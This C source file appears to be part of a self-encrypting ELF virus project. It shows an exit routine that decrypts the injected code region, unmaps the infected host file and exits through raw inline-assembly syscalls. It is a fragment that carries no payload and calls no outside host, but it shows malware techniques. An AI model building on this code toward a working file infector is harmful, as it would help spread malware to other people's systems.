#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _munmap(void *addr, size_t length)
{
	int ret = 0;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"

		"mov rax, 0xb\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline void _fatal(int status)
{
	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3c\n"
		"syscall\n"
		:
		: "g"(status)
	);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __exit(struct s_host *host, struct s_keychain *keychain, const enum e_context context)
{
	decrypt_right(keychain, (char *)injection, (void *)__exit - (void *)injection);

	printf("%s\t\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");

	(void)keychain;
	_munmap(host->header, host->filesize);

	_fatal(0);
}
